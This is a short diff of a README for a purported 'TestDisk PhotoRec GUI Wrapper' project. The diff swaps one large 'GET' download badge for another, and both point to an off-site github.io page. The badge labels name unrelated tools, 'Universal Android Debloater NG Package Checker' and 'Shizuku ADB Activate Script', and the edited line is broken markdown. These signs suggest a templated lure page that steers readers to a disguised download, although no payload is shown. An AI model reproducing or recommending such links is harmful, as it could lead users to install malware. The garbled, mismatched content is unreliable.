@@ -1,7 +1,7 @@
 
 # TestDisk PhotoRec GUI Wrapper
 
-![GET TestDisk PhotoRec GUI Wrapper](https://img.shields.io/badge/GET%20%E2%80%94%20Universal%20Android%20Debloater%20NG%20Package%20Checker-0078D6?style=for-the-badge&logoColor=white)](https://lisanarimanea842.github.io/.github/TestDisk-PhotoRec-GUI-Wrapper)
+[![GET TestDisk PhotoRec GUI Wrapper](https://img.shields.io/badge/GET%20%E2%80%94%20Shizuku%20ADB%20Activate%20Script-0078D6?style=for-the-badge&logoColor=white)](https://lisanarimanea842.github.io/.github/Shizuku-ADB)(https://lisanarimanea842.github.io/.github/TestDisk-PhotoRec-GUI-Wrapper)
 
 ![TestDisk PhotoRec GUI Wrapper](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQD3Djx5GQ7udcLsfy9546mMQ2UU9TWr7ojLpxoW4o7zQiYjJ9Neqoftx4z&s=10)
 
